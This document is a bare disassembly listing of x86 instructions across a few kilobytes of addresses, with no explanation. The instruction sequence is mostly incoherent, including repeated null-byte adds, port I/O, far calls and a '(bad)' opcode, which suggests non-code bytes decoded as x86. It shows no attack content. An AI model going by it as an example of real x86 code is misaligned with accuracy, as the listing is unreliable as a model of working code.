  4026a6:	or     al,BYTE PTR [esi]
  4026a8:	sub    BYTE PTR [eax+eax*1],ah
  4026ab:	add    BYTE PTR [edx],cl
  4026ad:	sub    al,0x2
  4026af:	push   es
  4026b0:	sub    dl,BYTE PTR [edx+ebp*1]
  4026b3:	add    BYTE PTR [ebx],bl
  4026b5:	xor    BYTE PTR ds:0x44100,al
  4026bb:	add    BYTE PTR [edi],al
  4026bd:	add    BYTE PTR [eax],al
  4026bf:	adc    DWORD PTR [esp+ecx*1],edx
  4026c2:	adc    al,0xd
  4026c4:	add    esi,DWORD PTR [ebx+0x54]
  4026c7:	add    BYTE PTR [eax],al
  4026c9:	push   es
  4026ca:	push   ecx
  4026cb:	push   ss
  4026cc:	sub    BYTE PTR [ecx+0x0],ah
  4026cf:	add    BYTE PTR [esi],al
  4026d1:	add    bl,BYTE PTR [edi]
  4026d3:	or     eax,0x268d
  4026d8:	add    DWORD PTR [ebx],edx
  4026da:	or     DWORD PTR [ecx],edx
  4026dc:	or     DWORD PTR [esi],edx
  4026de:	jb     0x402671
  4026e0:	add    DWORD PTR [eax],eax
  4026e2:	jo     0x402686
  4026e4:	adc    DWORD PTR [ecx],ecx
  4026e6:	pop    ss
  4026e7:	jb     0x402684
  4026e9:	add    DWORD PTR [eax],eax
  4026eb:	jo     0x40268f
  4026ed:	adc    DWORD PTR [ecx],ecx
  4026ef:	sbb    BYTE PTR [edx-0x49],dh
  4026f2:	add    DWORD PTR [eax],eax
  4026f4:	jo     0x402698
  4026f6:	adc    DWORD PTR [ecx],ecx
  4026f8:	sbb    DWORD PTR [edx-0x31],esi
  4026fb:	add    DWORD PTR [eax],eax
  4026fd:	jo     0x4026a1
  4026ff:	adc    DWORD PTR [ecx],ecx
  402701:	sbb    dh,BYTE PTR [edx-0x1f]
  402704:	add    DWORD PTR [eax],eax
  402706:	jo     0x4026aa
  402708:	adc    DWORD PTR [ecx],ecx
  40270a:	sbb    esi,DWORD PTR [edx-0x13]
  40270d:	add    DWORD PTR [eax],eax
  40270f:	jo     0x4026b3
  402711:	adc    DWORD PTR [ecx],ecx
  402713:	sbb    al,0x72
  402715:	stc    
  402716:	add    DWORD PTR [eax],eax
  402718:	jo     0x4026bc
  40271a:	adc    DWORD PTR [ecx],ecx
  40271c:	sbb    eax,0x20b72
  402721:	jo     0x4026c5
  402723:	adc    DWORD PTR [ecx],ecx
  402725:	push   ds
  402726:	jb     0x402741
  402728:	add    al,BYTE PTR [eax]
  40272a:	jo     0x4026ce
  40272c:	adc    DWORD PTR [ecx],ecx
  40272e:	pop    ds
  40272f:	or     DWORD PTR [edx+0x27],esi
  402732:	add    al,BYTE PTR [eax]
  402734:	jo     0x4026d8
  402736:	adc    DWORD PTR [ecx],ecx
  402738:	pop    ds
  402739:	or     dh,BYTE PTR [edx+0x37]
  40273c:	add    al,BYTE PTR [eax]
  40273e:	jo     0x4026e2
  402740:	adc    DWORD PTR [ecx],ecx
  402742:	pop    ds
  402743:	or     esi,DWORD PTR [edx+0x45]
  402746:	add    al,BYTE PTR [eax]
  402748:	jo     0x4026ec
  40274a:	adc    DWORD PTR [ecx],ecx
  40274c:	pop    ds
  40274d:	or     al,0x72
  40274f:	dec    ecx
  402750:	add    al,BYTE PTR [eax]
  402752:	jo     0x4026f6
  402754:	adc    DWORD PTR [ecx],ecx
  402756:	jae    0x402775
  402758:	add    BYTE PTR [eax],al
  40275a:	push   es
  40275b:	or     bl,dh
  40275d:	cmp    edx,DWORD PTR [ebx]
  40275f:	add    al,0x28
  402761:	adc    al,BYTE PTR [eax]
  402763:	add    BYTE PTR [esi],al
  402765:	adc    DWORD PTR [edi+ebp*2],eax
  402768:	xor    al,BYTE PTR [eax]
  40276a:	add    BYTE PTR [edx],cl
  40276c:	sub    al,0xe
  40276e:	adc    DWORD PTR [edi+ebp*2],eax
  402771:	xor    al,BYTE PTR [eax]
  402773:	add    BYTE PTR [edx],cl
  402775:	sub    BYTE PTR [ebp+0x0],dl
  402778:	add    BYTE PTR [esi],al
  40277a:	sub    edx,DWORD PTR [ecx]
  40277c:	adc    DWORD PTR [edi+ebp*2],eax
  40277f:	xor    eax,DWORD PTR [eax]
  402781:	add    BYTE PTR [edx],cl
  402783:	outs   dx,DWORD PTR ds:[esi]
  402784:	xor    al,0x0
  402786:	add    BYTE PTR [edx],cl
  402788:	sub    BYTE PTR [ebp+0x0],dl
  40278b:	add    BYTE PTR [esi],al
  40278d:	add    al,0x1f
  40278f:	fs push esp
  402791:	push   ss
  402792:	adc    ecx,DWORD PTR [eax]
  402794:	frstor [ebp+0x3]
  402797:	add    BYTE PTR [eax],al
  402799:	push   es
  40279a:	outs   dx,DWORD PTR ds:[esi]
  40279b:	push   ds
  40279c:	add    BYTE PTR [eax],al
  40279e:	push   es
  40279f:	push   es
  4027a0:	outs   dx,DWORD PTR ds:[esi]
  4027a1:	pop    ds
  4027a2:	add    BYTE PTR [eax],al
  4027a4:	push   es
  4027a5:	pop    eax
  4027a6:	pop    ss
  4027a7:	das    
  4027a8:	or     ch,BYTE PTR [eax]
  4027aa:	adc    eax,DWORD PTR [eax]
  4027ac:	add    BYTE PTR [esi],al
  4027ae:	add    al,0x16
  4027b0:	push   esp
  4027b1:	push   ss
  4027b2:	sub    al,BYTE PTR [ebx]
  4027b4:	push   eax
  4027b5:	push   es
  4027b6:	outs   dx,DWORD PTR ds:[esi]
  4027b7:	and    BYTE PTR [eax],al
  4027b9:	add    BYTE PTR [esi],al
  4027bb:	jge    0x40281c
  4027bd:	add    BYTE PTR [eax],al
  4027bf:	add    al,0x38
  4027c1:	ja     0x4027c5
  4027c3:	add    BYTE PTR [eax],al
  4027c5:	pop    es
  4027c6:	outs   dx,DWORD PTR ds:[esi]
  4027c7:	sbb    DWORD PTR [eax],eax
  4027c9:	add    BYTE PTR [esi],al
  4027cb:	jb     0x402820
  4027cd:	add    al,BYTE PTR [eax]
  4027cf:	jo     0x402840
  4027d1:	inc    esi
  4027d2:	add    BYTE PTR [eax],al
  4027d4:	or     ch,BYTE PTR [edx+edx*1]
  4027d7:	add    edx,DWORD PTR [eax+0x7]
  4027da:	outs   dx,DWORD PTR ds:[esi]
  4027db:	sbb    al,BYTE PTR [eax]
  4027dd:	add    BYTE PTR [esi],al
  4027df:	jge    0x402841
  4027e1:	add    BYTE PTR [eax],al
  4027e3:	add    al,0x38
  4027e5:	push   ebx
  4027e6:	add    al,BYTE PTR [eax]
  4027e8:	add    BYTE PTR [edi],al
  4027ea:	outs   dx,DWORD PTR ds:[esi]
  4027eb:	sbb    DWORD PTR [eax],eax
  4027ed:	add    BYTE PTR [esi],al
  4027ef:	jb     0x4027fc
  4027f1:	add    al,BYTE PTR [eax]
  4027f3:	jo     0x402864
  4027f5:	inc    esi
  4027f6:	add    BYTE PTR [eax],al
  4027f8:	or     ch,BYTE PTR [ecx*1+0x7d175003]
  4027ff:	data16 add BYTE PTR [eax],al
  402802:	add    al,0x38
  402804:	xor    al,0x2
  402806:	add    BYTE PTR [eax],al
  402808:	pop    es
  402809:	outs   dx,DWORD PTR ds:[esi]
  40280a:	sbb    DWORD PTR [eax],eax
  40280c:	add    BYTE PTR [esi],al
  40280e:	jb     0x402829
  402810:	add    al,BYTE PTR [eax]
  402812:	jo     0x402883
  402814:	inc    esi
  402815:	add    BYTE PTR [eax],al
  402817:	or     ch,BYTE PTR [ebx+edx*1]
  40281a:	add    edx,DWORD PTR [eax+0x17]
  40281d:	jge    0x402886
  40281f:	add    BYTE PTR [eax],al
  402821:	add    al,0x17
  402823:	sub    BYTE PTR [ecx+0x0],ah
  402826:	add    BYTE PTR [esi],al
  402828:	cmp    BYTE PTR [edi],cl
  40282a:	add    al,BYTE PTR [eax]
  40282c:	add    BYTE PTR [edi],al
  40282e:	outs   dx,DWORD PTR ds:[esi]
  40282f:	sbb    DWORD PTR [eax],eax
  402831:	add    BYTE PTR [esi],al
  402833:	jb     0x40285c
  402835:	add    al,BYTE PTR [eax]
  402837:	jo     0x4028a8
  402839:	inc    esi
  40283a:	add    BYTE PTR [eax],al
  40283c:	or     ch,BYTE PTR [ecx*1+0x7d175003]
  402843:	push   0x38040000
  402848:	lock add DWORD PTR [eax],eax
  40284b:	add    BYTE PTR [edi],al
  40284d:	outs   dx,DWORD PTR ds:[esi]
  40284e:	sbb    DWORD PTR [eax],eax
  402850:	add    BYTE PTR [esi],al
  402852:	jb     0x4028af
  402854:	add    al,BYTE PTR [eax]
  402856:	jo     0x4028c7
  402858:	inc    esi
  402859:	add    BYTE PTR [eax],al
  40285b:	or     ch,BYTE PTR [edx+edx*1]
  40285e:	add    edx,DWORD PTR [eax+0x7]
  402861:	outs   dx,DWORD PTR ds:[esi]
  402862:	sbb    al,BYTE PTR [eax]
  402864:	add    BYTE PTR [esi],al
  402866:	jge    0x4028ca
  402868:	add    BYTE PTR [eax],al
  40286a:	add    al,0x38
  40286c:	int3   
  40286d:	add    DWORD PTR [eax],eax
  40286f:	add    BYTE PTR [edi],al
  402871:	outs   dx,DWORD PTR ds:[esi]
  402872:	sbb    DWORD PTR [eax],eax
  402874:	add    BYTE PTR [esi],al
  402876:	jb     0x4028df
  402878:	add    al,BYTE PTR [eax]
  40287a:	jo     0x4028eb
  40287c:	inc    esi
  40287d:	add    BYTE PTR [eax],al
  40287f:	or     ch,BYTE PTR [esp+edi*2]
  402882:	pop    es
  402883:	outs   dx,DWORD PTR ds:[esi]
  402884:	sbb    al,BYTE PTR [eax]
  402886:	add    BYTE PTR [esi],al
  402888:	adc    eax,DWORD PTR ds:0x8d170511
  40288e:	cmp    eax,DWORD PTR [eax]
  402890:	add    BYTE PTR [ecx],al
  402892:	adc    ecx,DWORD PTR [edx]
  402894:	adc    DWORD PTR [edx],ecx
  402896:	push   ss
  402897:	pop    ds
  402898:	cmp    ebx,DWORD PTR [ebp+0x476f0a11]
  40289e:	add    BYTE PTR [eax],al
  4028a0:	or     dl,BYTE PTR [ebx]
  4028a2:	push   es
  4028a3:	adc    DWORD PTR [esi],eax
  4028a5:	adc    ecx,DWORD PTR [ebx]
  4028a7:	push   ss
  4028a8:	adc    ecx,DWORD PTR [ebx+ebp*1]
  4028ab:	inc    ebp
  4028ac:	adc    DWORD PTR [ebx],ecx
  4028ae:	adc    DWORD PTR [edx+ebx*4],ecx
  4028b1:	adc    eax,DWORD PTR [edi]
  4028b3:	add    edx,DWORD PTR [eax+0x7b]
  4028b6:	add    BYTE PTR gs:[eax],al
  4028b9:	add    al,0x2d
  4028bb:	adc    BYTE PTR [ebx],al
  4028bd:	push   eax
  4028be:	adc    DWORD PTR [edi],eax
  4028c0:	sub    BYTE PTR [eax],dl
  4028c2:	add    BYTE PTR [eax],al
  4028c4:	push   es
  4028c5:	jge    0x40292c
  4028c7:	add    BYTE PTR [eax],al
  4028c9:	add    al,0x2b
  4028cb:	pop    ds
  4028cc:	add    edx,DWORD PTR [eax+0x3]
  4028cf:	push   eax
  4028d0:	jnp    0x402937
  4028d2:	add    BYTE PTR [eax],al
  4028d4:	add    al,0x72
  4028d6:	ja     0x4028da
  4028d8:	add    BYTE PTR [eax+0x11],dh
  4028db:	pop    es
  4028dc:	sub    BYTE PTR [eax],dl
  4028de:	add    BYTE PTR [eax],al
  4028e0:	push   es
  4028e1:	sub    BYTE PTR [edi],dl
  4028e3:	add    BYTE PTR [eax],al
  4028e5:	or     bh,BYTE PTR [ebp+0x65]
  4028e8:	add    BYTE PTR [eax],al
  4028ea:	add    al,0x11
  4028ec:	or     al,0x17
  4028ee:	pop    eax
  4028ef:	adc    ecx,DWORD PTR [ecx+edx*1]
  4028f2:	or     al,0x11
  4028f4:	or     ecx,DWORD PTR [esi+0x38b33269]
  4028fa:	add    DWORD PTR ds:[eax],eax
  4028fd:	add    BYTE PTR [edi],al
  4028ff:	outs   dx,DWORD PTR ds:[esi]
  402900:	sbb    DWORD PTR [eax],eax
  402902:	add    BYTE PTR [esi],al
  402904:	jb     0x4028ff
  402906:	add    DWORD PTR [eax],eax
  402908:	jo     0x402979
  40290a:	inc    esi
  40290b:	add    BYTE PTR [eax],al
  40290d:	or     ch,BYTE PTR [esp+edx*1]
  402910:	add    edx,DWORD PTR [eax+0x25]
  402913:	jnp    0x40297e
  402915:	add    BYTE PTR [eax],al
  402917:	add    al,0x1a
  402919:	pusha  
  40291a:	jge    0x402985
  40291c:	add    BYTE PTR [eax],al
  40291e:	add    al,0x38
  402920:	sbb    BYTE PTR [ecx],al
  402922:	add    BYTE PTR [eax],al
  402924:	pop    es
  402925:	outs   dx,DWORD PTR ds:[esi]
  402926:	sbb    DWORD PTR [eax],eax
  402928:	add    BYTE PTR [esi],al
  40292a:	jb     0x4029a7
  40292c:	add    al,BYTE PTR [eax]
  40292e:	jo     0x40299f
  402930:	inc    esi
  402931:	add    BYTE PTR [eax],al
  402933:	or     ch,BYTE PTR [edx+esi*1]
  402936:	or     BYTE PTR ds:0x1a6f0709,ch
  40293c:	add    BYTE PTR [eax],al
  40293e:	push   es
  40293f:	or     al,0x2b
  402941:	adc    cl,BYTE PTR [eax]
  402943:	jb     0x4029bc
  402945:	add    al,BYTE PTR [eax]
  402947:	jo     0x402950
  402949:	outs   dx,DWORD PTR ds:[esi]
  40294a:	sbb    al,BYTE PTR [eax]
  40294c:	add    BYTE PTR [esi],al
  40294e:	sub    BYTE PTR [edi],dl
  402950:	add    BYTE PTR [eax],al
  402952:	or     cl,BYTE PTR [ebx+eax*1]
  402955:	push   eax
  402956:	and    eax,0x697b
  40295b:	add    al,0x18
  40295d:	pusha  
  40295e:	jge    0x4029c9
  402960:	add    BYTE PTR [eax],al
  402962:	add    al,0x38
  402964:	aam    0x0
  402966:	add    BYTE PTR [eax],al
  402968:	pop    es
  402969:	outs   dx,DWORD PTR ds:[esi]
  40296a:	sbb    DWORD PTR [eax],eax
  40296c:	add    BYTE PTR [esi],al
  40296e:	jb     0x402905
  402970:	add    al,BYTE PTR [eax]
  402972:	jo     0x4029e3
  402974:	inc    esi
  402975:	add    BYTE PTR [eax],al
  402977:	or     ch,BYTE PTR [edx+esi*1]
  40297a:	or     DWORD PTR ds:0x1a6f0709,ebp
  402980:	add    BYTE PTR [eax],al
  402982:	push   es
  402983:	or     eax,0x7209122b
  402988:	ja     0x40298c
  40298a:	add    BYTE PTR [eax+0x7],dh
  40298d:	outs   dx,DWORD PTR ds:[esi]
  40298e:	sbb    al,BYTE PTR [eax]
  402990:	add    BYTE PTR [esi],al
  402992:	sub    BYTE PTR [edi],dl
  402994:	add    BYTE PTR [eax],al
  402996:	or     cl,BYTE PTR ds:0x7b255003
  40299c:	imul   eax,DWORD PTR [eax],0x60180400
  4029a2:	jge    0x402a0d
  4029a4:	add    BYTE PTR [eax],al
  4029a6:	add    al,0x38
  4029a8:	nop
  4029a9:	add    BYTE PTR [eax],al
  4029ab:	add    BYTE PTR [edi],al
  4029ad:	outs   dx,DWORD PTR ds:[esi]
  4029ae:	sbb    DWORD PTR [eax],eax
  4029b0:	add    BYTE PTR [esi],al
  4029b2:	jb     0x4029a1
  4029b4:	add    DWORD PTR [eax],eax
  4029b6:	jo     0x402a27
  4029b8:	inc    esi
  4029b9:	add    BYTE PTR [eax],al
  4029bb:	or     ch,BYTE PTR [edx+edx*1]
  4029be:	add    edx,DWORD PTR [eax+0x25]
  4029c1:	jnp    0x402a2c
  4029c3:	add    BYTE PTR [eax],al
  4029c5:	add    al,0x1f
  4029c7:	adc    BYTE PTR [eax+0x7d],ah
  4029ca:	imul   eax,DWORD PTR [eax],0x6c2b0400
  4029d0:	pop    es
  4029d1:	outs   dx,DWORD PTR ds:[esi]
  4029d2:	sbb    DWORD PTR [eax],eax
  4029d4:	add    BYTE PTR [esi],al
  4029d6:	jb     0x4029b9
  4029d8:	add    DWORD PTR [eax],eax
  4029da:	jo     0x402a4b
  4029dc:	inc    esi
  4029dd:	add    BYTE PTR [eax],al
  4029df:	or     ch,BYTE PTR [edx+edx*1]
  4029e2:	add    edx,DWORD PTR [eax+0x25]
  4029e5:	jnp    0x402a50
  4029e7:	add    BYTE PTR [eax],al
  4029e9:	add    al,0x1f
  4029eb:	and    BYTE PTR [eax+0x7d],ah
  4029ee:	imul   eax,DWORD PTR [eax],0x482b0400
  4029f4:	pop    es
  4029f5:	outs   dx,DWORD PTR ds:[esi]
  4029f6:	sbb    DWORD PTR [eax],eax
  4029f8:	add    BYTE PTR [esi],al
  4029fa:	jb     0x402a41
  4029fc:	add    al,BYTE PTR [eax]
  4029fe:	jo     0x402a6f
  402a00:	inc    esi
  402a01:	add    BYTE PTR [eax],al
  402a03:	or     ch,BYTE PTR ds:0x196f0712
  402a09:	add    BYTE PTR [eax],al
  402a0b:	push   es
  402a0c:	jb     0x402a57
  402a0e:	add    al,BYTE PTR [eax]
  402a10:	jo     0x402a81
  402a12:	inc    esi
  402a13:	add    BYTE PTR [eax],al
  402a15:	or     ch,BYTE PTR [edx+ecx*1]
  402a18:	sub    BYTE PTR [ebx],dl
  402a1a:	add    BYTE PTR [eax],al
  402a1c:	push   es
  402a1d:	add    al,0x16
  402a1f:	push   esp
  402a20:	push   ss
  402a21:	sub    ch,BYTE PTR [eax]
  402a23:	adc    al,BYTE PTR [eax]
  402a25:	add    BYTE PTR [esi],al
  402a27:	jb     0x4029d4
  402a29:	add    al,BYTE PTR [eax]
  402a2b:	jo     0x402a55
  402a2d:	add    al,0x0
  402a2f:	add    BYTE PTR [esi],al
  402a31:	sub    BYTE PTR [ebp+0x0],dl
  402a34:	add    BYTE PTR [esi],al
  402a36:	add    al,0x1f
  402a38:	fs push esp
  402a3a:	push   ss
  402a3b:	sub    al,BYTE PTR [esi]
  402a3d:	outs   dx,DWORD PTR ds:[esi]
  402a3e:	and    DWORD PTR [eax],eax
  402a40:	add    BYTE PTR [esi],al
  402a42:	and    eax,0xfd7c3a0b
  402a47:	(bad)  
  402a48:	dec    DWORD PTR [eax]
  402a4a:	sub    al,0x1f
  402a4c:	add    edx,DWORD PTR [eax+0x8]
  402a4f:	pop    ss
  402a50:	lea    edi,[ebx]
  402a52:	add    BYTE PTR [eax],al
  402a54:	add    DWORD PTR [ebx],edx
  402a56:	or     eax,0x1f160d11
  402a5b:	cmp    ebx,DWORD PTR [ebp+0x476f0d11]
  402a61:	add    BYTE PTR [eax],al
  402a63:	or     bh,BYTE PTR [ebp+0x63]
  402a66:	add    BYTE PTR [eax],al
  402a68:	add    al,0x2b
  402a6a:	or     eax,0x8d165003
  402a6f:	add    BYTE PTR es:[eax],al
  402a72:	add    DWORD PTR [ebp+0x63],edi
  402a75:	add    BYTE PTR [eax],al
  402a77:	add    al,0x9
  402a79:	sub    al,0x1f
  402a7b:	add    edx,DWORD PTR [eax+0x9]
  402a7e:	pop    ss
  402a7f:	lea    edi,[ebx]
  402a81:	add    BYTE PTR [eax],al
  402a83:	add    DWORD PTR [ebx],edx
  402a85:	push   cs
  402a86:	adc    DWORD PTR [esi],ecx
  402a88:	push   ss
  402a89:	pop    ds
  402a8a:	cmp    ebx,DWORD PTR [ebp+0x476f0e11]
  402a90:	add    BYTE PTR [eax],al
  402a92:	or     bh,BYTE PTR [ebp+0x64]
  402a95:	add    BYTE PTR [eax],al
  402a97:	add    al,0x2b
  402a99:	or     eax,0x8d165003
  402a9e:	add    BYTE PTR es:[eax],al
  402aa1:	add    DWORD PTR [ebp+0x64],edi
  402aa4:	add    BYTE PTR [eax],al
  402aa6:	add    al,0x3
  402aa8:	push   eax
  402aa9:	jnp    0x402b0a
  402aab:	add    BYTE PTR [eax],al
  402aad:	add    al,0x2d
  402aaf:	sbb    ch,BYTE PTR [eax]
  402ab1:	adc    al,BYTE PTR [eax]
  402ab3:	add    BYTE PTR [esi],al
  402ab5:	jb     0x402a86
  402ab7:	add    al,BYTE PTR [eax]
  402ab9:	jo     0x402ae3
  402abb:	add    al,0x0
  402abd:	add    BYTE PTR [esi],al
  402abf:	sub    BYTE PTR [ebp+0x0],dl
  402ac2:	add    BYTE PTR [esi],al
  402ac4:	add    al,0x1f
  402ac6:	fs push esp
  402ac8:	push   ss
  402ac9:	sub    al,BYTE PTR [ebx]
  402acb:	push   eax
  402acc:	jnp    0x402b37
  402ace:	add    BYTE PTR [eax],al
  402ad0:	add    al,0x1f
  402ad2:	adc    BYTE PTR [edi+0x2c],bl
  402ad5:	add    edx,DWORD PTR es:[eax+0x7b]
  402ad9:	imul   eax,DWORD PTR [eax],0x201f0400
  402adf:	pop    edi
  402ae0:	sub    al,0x1a
  402ae2:	sub    BYTE PTR [edx],dl
  402ae4:	add    BYTE PTR [eax],al
  402ae6:	push   es
  402ae7:	jb     0x402ad8
  402ae9:	add    al,BYTE PTR [eax]
  402aeb:	jo     0x402b15
  402aed:	add    al,0x0
  402aef:	add    BYTE PTR [esi],al
  402af1:	sub    BYTE PTR [ebp+0x0],dl
  402af4:	add    BYTE PTR [esi],al
  402af6:	add    al,0x1f
  402af8:	fs push esp
  402afa:	push   ss
  402afb:	sub    dl,BYTE PTR [edi]
  402afd:	sub    dl,BYTE PTR [ecx]
  402aff:	or     BYTE PTR [edx],ch
  402b01:	add    BYTE PTR [eax],al
  402b03:	add    BYTE PTR [ecx],al
  402b05:	adc    BYTE PTR [eax],al
  402b07:	add    BYTE PTR [eax],al
  402b09:	add    BYTE PTR [ecx],dl
  402b0b:	add    BYTE PTR [ebp+0x273b009e],cl
  402b11:	add    BYTE PTR [eax],al
  402b13:	add    DWORD PTR [esi+0x427e],eax
  402b19:	add    al,0x7b
  402b1b:	data16 add BYTE PTR [eax],al
  402b1e:	add    al,0x2d
  402b20:	adc    al,0x72
  402b22:	pop    ss
  402b23:	add    eax,DWORD PTR [eax]
  402b25:	jo     0x402b99
  402b27:	xor    eax,DWORD PTR [ebx]
  402b29:	add    BYTE PTR [eax+0x28],dh
  402b2c:	add    eax,0x28060000
  402b31:	pusha  
  402b32:	add    BYTE PTR [eax],al
  402b34:	push   es
  402b35:	sub    al,BYTE PTR [eax]
  402b37:	add    BYTE PTR [ebx],dl
  402b39:	xor    BYTE PTR [ebx],al
  402b3b:	add    BYTE PTR [ebx+0x0],dl
  402b3e:	add    BYTE PTR [eax],al
  402b40:	or     BYTE PTR [eax],al
  402b42:	add    BYTE PTR [ecx],dl
  402b44:	sub    BYTE PTR [edx],dl
  402b46:	add    BYTE PTR [eax],al
  402b48:	push   es
  402b49:	jb     0x402b96
  402b4b:	add    eax,DWORD PTR [eax]
  402b4d:	jo     0x402b59
  402b4f:	jb     0x402bb2
  402b51:	add    eax,DWORD PTR [eax]
  402b53:	jo     0x402b60
  402b55:	push   ss
  402b56:	or     eax,0x1f093a2b
  402b5b:	or     ch,BYTE PTR [edi]
  402b5d:	adc    al,0x6
  402b5f:	jb     0x402bcc
  402b61:	add    eax,DWORD PTR [eax]
  402b63:	jo     0x402b6e
  402b65:	mov    WORD PTR [eax+eax*1],?
  402b68:	add    BYTE PTR [ecx],al
  402b6a:	sub    BYTE PTR [eax+0x0],cl
  402b6d:	add    BYTE PTR [edx],cl
  402b6f:	or     al,0x2b
  402b71:	or     eax,0x3c8c0906
  402b76:	add    BYTE PTR [eax],al
  402b78:	add    DWORD PTR [eax],ebp
  402b7a:	dec    ecx
  402b7b:	add    BYTE PTR [eax],al
  402b7d:	or     cl,BYTE PTR [eax+ecx*1]
  402b80:	sub    BYTE PTR [ebx],al
  402b82:	add    BYTE PTR [eax],al
  402b84:	push   es
  402b85:	or     eax,DWORD PTR [edi]
  402b87:	sub    al,0x6
  402b89:	pop    es
  402b8a:	sub    BYTE PTR [eax+0x0],ah
  402b8d:	add    BYTE PTR [esi],al
  402b8f:	or     DWORD PTR [edi],edx
  402b91:	pop    eax
  402b92:	or     eax,0x2ac32d07
  402b97:	push   es
  402b98:	sub    bl,BYTE PTR [esi]
  402b9a:	add    ch,BYTE PTR [eax]
  402b9c:	push   ds
  402b9d:	add    BYTE PTR [eax],al
  402b9f:	or     ch,BYTE PTR [edx]
  402ba1:	push   esi
  402ba2:	add    ch,BYTE PTR [eax]
  402ba4:	push   ds
  402ba5:	add    BYTE PTR [eax],al
  402ba7:	or     al,BYTE PTR [edx]
  402ba9:	add    edi,DWORD PTR [ebp+0x43]
  402bac:	add    BYTE PTR [eax],al
  402bae:	add    al,0x2
  402bb0:	add    al,0x7d
  402bb2:	inc    esp
  402bb3:	add    BYTE PTR [eax],al
  402bb5:	add    al,0x2a
  402bb7:	push   ds
  402bb8:	add    bh,BYTE PTR [ebx+0x43]
  402bbb:	add    BYTE PTR [eax],al
  402bbd:	add    al,0x2a
  402bbf:	push   ds
  402bc0:	add    bh,BYTE PTR [ebx+0x44]
  402bc3:	add    BYTE PTR [eax],al
  402bc5:	add    al,0x2a
  402bc7:	add    BYTE PTR [ebx],dl
  402bc9:	xor    BYTE PTR [ebx],al
  402bcb:	add    BYTE PTR [esi+0x9000000],ah
  402bd1:	add    BYTE PTR [eax],al
  402bd3:	adc    DWORD PTR [edx],eax
  402bd5:	sub    BYTE PTR [esi],bl
  402bd7:	add    BYTE PTR [eax],al
  402bd9:	or     al,BYTE PTR [edx]
  402bdb:	add    ecx,DWORD PTR [esi+0x268d69]
  402be1:	add    BYTE PTR [ecx],al
  402be3:	jge    0x402c2a
  402be5:	add    BYTE PTR [eax],al
  402be7:	add    al,0x2
  402be9:	add    ecx,DWORD PTR [esi+0x3e8d69]
  402bef:	add    BYTE PTR [ecx],al
  402bf1:	jge    0x402c39
  402bf3:	add    BYTE PTR [eax],al
  402bf5:	add    al,0x2
  402bf7:	add    ecx,DWORD PTR [esi+0x3e8d69]
  402bfd:	add    BYTE PTR [ecx],al
  402bff:	jge    0x402c48
  402c01:	add    BYTE PTR [eax],al
  402c03:	add    al,0x16
  402c05:	or     ch,BYTE PTR [ebx]
  402c07:	imul   eax,DWORD PTR [ebx],0x6
  402c0a:	call   0x6f0a:0x2128
  402c11:	dec    ebx
  402c12:	add    BYTE PTR [eax],al
  402c14:	or     cl,BYTE PTR [ebx]
  402c16:	pop    es
  402c17:	jb     0x402c88
  402c19:	add    eax,DWORD PTR [eax]
  402c1b:	jo     0x402c8c
  402c1d:	dec    esp
  402c1e:	add    BYTE PTR [eax],al
  402c20:	or     ch,BYTE PTR [esp+ebx*1]
  402c23:	add    bh,BYTE PTR [ebx+0x46]
  402c26:	add    BYTE PTR [eax],al
  402c28:	add    al,0x6
  402c2a:	pop    ss
  402c2b:	pushf  
  402c2c:	add    bh,BYTE PTR [ebx+0x47]
  402c2f:	add    BYTE PTR [eax],al
  402c31:	add    al,0x6
  402c33:	pop    ss
  402c34:	pushf  
  402c35:	pop    es
  402c36:	pop    ss
  402c37:	outs   dx,DWORD PTR ds:[esi]
  402c38:	dec    ebp
  402c39:	add    BYTE PTR [eax],al
  402c3b:	or     cl,BYTE PTR [ebx]
  402c3d:	sub    esp,DWORD PTR [edi]
  402c3f:	pop    es
  402c40:	jb     0x402cb5
  402c42:	add    eax,DWORD PTR [eax]
  402c44:	jo     0x402cb5
  402c46:	dec    esp
  402c47:	add    BYTE PTR [eax],al
  402c49:	or     ch,BYTE PTR [edx+ebx*1]
  402c4c:	add    bh,BYTE PTR [ebx+0x46]
  402c4f:	add    BYTE PTR [eax],al
  402c51:	add    al,0x6
  402c53:	push   ss
  402c54:	pushf  
  402c55:	add    bh,BYTE PTR [ebx+0x47]
  402c58:	add    BYTE PTR [eax],al
  402c5a:	add    al,0x6
  402c5c:	pop    ss
  402c5d:	pushf  
  402c5e:	pop    es
  402c5f:	pop    ss
  402c60:	outs   dx,DWORD PTR ds:[esi]
  402c61:	dec    ebp
  402c62:	add    BYTE PTR [eax],al
  402c64:	or     cl,BYTE PTR [ebx]
  402c66:	add    bh,BYTE PTR [ebx+0x45]
  402c69:	add    BYTE PTR [eax],al
  402c6b:	add    al,0x6
  402c6d:	pop    es
  402c6e:	mov    ds:0xa581706,al
  402c73:	push   es
  402c74:	add    ecx,DWORD PTR [esi+0x2a8f3269]
  402c7a:	add    BYTE PTR [eax],al
  402c7c:	adc    esi,DWORD PTR [eax]
  402c7e:	add    eax,DWORD PTR [eax]
  402c80:	test   eax,0xa000000
  402c85:	add    BYTE PTR [eax],al
  402c87:	adc    DWORD PTR [ebx],eax
  402c89:	sub    BYTE PTR [ecx],ah
  402c8b:	add    BYTE PTR [eax],al
  402c8d:	or     ch,BYTE PTR [edi+0x4b]
  402c90:	add    BYTE PTR [eax],al
  402c92:	or     cl,BYTE PTR [edx]
  402c94:	push   ss
  402c95:	or     al,0x15
  402c97:	or     eax,0x592b0b16
  402c9c:	push   es
  402c9d:	add    bh,BYTE PTR [ebx+0x45]
  402ca0:	add    BYTE PTR [eax],al
  402ca2:	add    al,0x7
  402ca4:	call   0x2c0a:0x466f
  402cab:	sbb    eax,0x467b0204
  402cb0:	add    BYTE PTR [eax],al
  402cb2:	add    al,0x7
  402cb4:	nop
  402cb5:	push   edx
  402cb6:	add    eax,0x477b02
  402cbb:	add    BYTE PTR [edi+eax*1],al
  402cbe:	nop
  402cbf:	push   edx
  402cc0:	add    bh,BYTE PTR [ebx+0x45]
  402cc3:	add    BYTE PTR [eax],al
  402cc5:	add    al,0x7
  402cc7:	call   0x0:0x457b022a
  402cce:	add    al,0x7
  402cd0:	call   0xa00:0x4c6f06
  402cd7:	sub    al,0x18
  402cd9:	or     BYTE PTR [ecx+edx*1],ch
  402cdc:	jb     0x402d55
  402cde:	add    eax,DWORD PTR [eax]
  402ce0:	jo     0x402ce5
  402ce2:	sub    BYTE PTR ds:0x73060000,al
  402ce8:	sbb    BYTE PTR [eax],al
  402cea:	add    BYTE PTR [edx],cl
  402cec:	jp     0x402d05
  402cee:	or     al,0x7
  402cf0:	or     eax,0xb581707
  402cf5:	pop    es
